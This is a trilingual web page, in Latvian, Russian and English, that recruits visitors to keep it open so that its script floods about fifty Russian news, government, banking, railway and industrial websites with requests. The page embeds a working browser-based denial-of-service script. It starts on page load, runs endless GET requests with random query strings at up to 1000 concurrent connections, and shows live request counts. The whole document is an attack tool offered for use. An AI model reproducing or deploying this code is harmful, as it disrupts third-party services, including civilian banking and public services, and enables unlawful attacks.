<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>krievija IR JĀAPTUR</title>
  </head>
  <body>
    <h1>Krievija IR JĀAPTUR! Palīdzi Ukrainai UZVARĒT!</h1>
    <div style="display: flex; padding: 1rem">
      <div>
        <h2>Latviešu versija</h2>
        <p>
          Krievijas federācijas "officiālās" ziņas ir pārsvarā viltus un mēs
          ticam, ka labāk tās ir pārtraukt un ļaut cilvēkiem pārslēgties uz
          ticamām ziņām
        </p>
        <p>
          Lūdzu turi šo lapu vaļā savās ierīcēs. Tā pārpludinās Krievijas
          propogandas vietnes un radīs lielu slodzi tās infrastruktūrai
        </p>
        <p>
          Tavs interneta pārlūks būs lēns. Tas nekas, neuztraucies un turpini
          sesiju.
        </p>
        <p>Mazs ieguldījums no mums katra izglābs Ukrainu 🙏</p>
      </div>
      <div>
        <h2>Русская версия</h2>
        <p>
          «Официальные» новости в РФ полны пропаганды и транслируют лживую
          информацию о событиях на Украине. Мы считаем, что лучше их закрыть и
          позволить людям переключиться на достоверные новости
        </p>
        <p>
          Пожалуйста, откройте эту страницу на ваших устройствах. Это зальёт
          российские пропагандистские сайты запросами и создаст огромную
          нагрузку на их инфраструктуру.
        </p>
        <p>
          Ваш браузер будет работать медленно. Все в порядке, не волнуйтесь и
          держите его открытым.
        </p>
        <p>Небольшой вклад каждого из нас спасет Украину 🙏</p>
      </div>
      <div>
        <h2>English version</h2>
        <p>
          The "official" news in the Russian Federation is mostly fake and we
          believe it is better to shut them down and let people switch to
          trustful news.
        </p>
        <p>
          Please, just open this page and let it be open on your devices. It
          will flood the Russian propaganda websites and pose a huge load on
          their infrastructure.
        </p>
        <p>Your browser will be slow. It's ok, don't worry and keep it run.</p>
        <p>A small contribution from each of us will save Ukraine 🙏</p>
      </div>
    </div>

    <div id="stats"></div>

    <script>
      var targets = {
        // "https://bb.lv/": {
        //   number_of_requests: 0,
        //   number_of_errored_responses: 0,
        // },
        "https://lv.sputniknews.ru/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://sputniknewslv.com/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://lv.baltnews.com/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://lenta.ru/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://ria.ru/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://ria.ru/lenta/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://www.rbc.ru/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://www.rt.com/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "http://kremlin.ru/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "http://en.kremlin.ru/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://smotrim.ru/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://tass.ru/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://tvzvezda.ru/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://vsoloviev.ru/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://www.1tv.ru/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://www.vesti.ru/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://online.sberbank.ru/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://sberbank.ru/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://zakupki.gov.ru/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://www.gosuslugi.ru/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://er.ru/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://www.rzd.ru/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://rzdlog.ru/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://vgtrk.ru/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://www.interfax.ru/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://www.mos.ru/uslugi/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "http://government.ru/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://mil.ru/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://www.nalog.gov.ru/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://customs.gov.ru/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://pfr.gov.ru/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://rkn.gov.ru/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://www.gazprombank.ru/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://www.vtb.ru/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://www.gazprom.ru/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://lukoil.ru": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://magnit.ru/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://www.nornickel.com/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://www.surgutneftegas.ru/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://www.tatneft.ru/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://www.evraz.com/ru/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://nlmk.com/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://www.sibur.ru/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://www.severstal.com/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://www.metalloinvest.com/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://nangs.org/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://rmk-group.ru/ru/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://www.tmk-group.ru/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://ya.ru/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://www.polymetalinternational.com/ru/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://www.uralkali.com/ru/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://www.eurosib.ru/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://ugmk.ua/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
        "https://omk.ru/": {
          number_of_requests: 0,
          number_of_errored_responses: 0,
        },
      };

      var statsEl = document.getElementById("stats");
      function printStats() {
        statsEl.innerHTML =
          '<table width="100%"><thead><tr><th>URL</th><th>Number of Requests</th><th>Number of Errors</th></tr></thead><tbody>' +
          Object.entries(targets)
            .map(
              ([target, { number_of_requests, number_of_errored_responses }]) =>
                "<tr><td>" +
                target +
                "</td><td>" +
                number_of_requests +
                "</td><td>" +
                number_of_errored_responses +
                "</td></tr>"
            )
            .join("") +
          "</tbody></table>";
      }
      setInterval(printStats, 1000);

      var CONCURRENCY_LIMIT = 1000;
      var queue = [];

      async function fetchWithTimeout(resource, options) {
        const controller = new AbortController();
        const id = setTimeout(() => controller.abort(), options.timeout);
        return fetch(resource, {
          method: "GET",
          mode: "no-cors",
          signal: controller.signal,
        })
          .then((response) => {
            clearTimeout(id);
            return response;
          })
          .catch((error) => {
            clearTimeout(id);
            throw error;
          });
      }

      async function flood(target) {
        for (var i = 0; ; ++i) {
          if (queue.length > CONCURRENCY_LIMIT) {
            await queue.shift();
          }
          rand = i % 3 === 0 ? "" : "?" + Math.random() * 1000;
          queue.push(
            fetchWithTimeout(target + rand, { timeout: 1000 })
              .catch((error) => {
                if (error.code === 20 /* ABORT */) {
                  return;
                }
                targets[target].number_of_errored_responses++;
              })
              .then((response) => {
                if (response && !response.ok) {
                  targets[target].number_of_errored_responses++;
                }
                targets[target].number_of_requests++;
              })
          );
        }
      }

      // Start
      Object.keys(targets).map(flood);
    </script>
  </body>
</html>
